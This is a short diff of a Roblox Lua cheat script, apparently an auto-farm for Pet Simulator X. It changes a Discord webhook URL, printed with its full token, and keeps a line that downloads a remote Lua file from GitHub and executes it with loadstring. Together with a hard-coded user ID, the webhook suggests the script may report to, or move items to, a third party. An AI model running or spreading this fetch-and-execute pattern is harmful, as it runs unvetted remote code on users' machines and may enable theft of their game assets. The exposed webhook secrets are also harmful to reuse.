@@ -1,4 +1,4 @@
 _G.UserID = 1690659151
-_G.WebHook = "https://discord.com/api/webhooks/1062635781954478121/JRZKdueQkk5phFz60gbdFtu9CCCU3lBEDZ-xEIjqF_zbEBkJKITmOL8I0EmJJ4C-gy-G"
+_G.WebHook = "https://discord.com/api/webhooks/1062638007011770398/5QQUGewyj-1XuIA9l67U4Z0GFXsbYDDvsTF1AYr5SM2_WwLy2n3xN9Drq-etbDqe03Tz"
 _G.LoadingScreenText = "Here"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
